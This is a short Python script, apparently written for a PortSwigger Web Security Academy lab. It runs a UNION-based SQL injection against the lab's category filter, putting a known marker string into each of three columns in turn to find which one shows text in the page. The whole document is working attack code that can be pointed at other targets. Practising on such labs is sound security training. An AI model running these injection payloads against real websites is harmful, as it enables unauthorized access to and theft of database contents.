import requests
from bs4 import BeautifulSoup

site = '0aab0047047506e4801d1280000a00fd.web-security-academy.net'
s = requests.Session()

hint_text = 't7E3V9'  # this is your known hint

# Function to try a SQL injection payload
def try_payload(payload):
    url = f'https://{site}/filter?category={payload}'
    resp = s.get(url)
    if hint_text in resp.text:
        print("✅ Found hint in response!")
    else:
        print("❌ Hint not found.")
    return resp.text

# Now try placing 't7E3V9' into different columns
columns = 3  # Set based on what you found before!

for i in range(columns):
    payload_list = ['null'] * columns
    payload_list[i] = f"'{hint_text}'"  # Inject hint into one column
    payload = "Gifts' UNION SELECT " + ",".join(payload_list) + " -- "
    print(f"\nTrying with hint_text in column {i+1}:")
    try_payload(payload)

